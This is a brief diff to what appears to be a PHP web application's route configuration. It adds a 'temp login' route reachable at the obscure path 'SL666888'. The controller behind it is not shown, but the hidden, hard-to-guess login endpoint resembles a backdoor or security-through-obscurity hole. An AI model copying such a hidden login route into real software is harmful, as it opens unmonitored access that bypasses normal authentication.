@@ -17,5 +17,6 @@ return [
 	'sl/message/update-abnormal/<id:\d+>' => 'sl/message/update-abnormal',
 	// sl/report
 	'sl/report/crontab-data/<data_type:\w+>' => 'sl/report/crontab-data',
-
+    //sl temp login
+    'SL666888' => 'sl/temp-login/index',
 ];
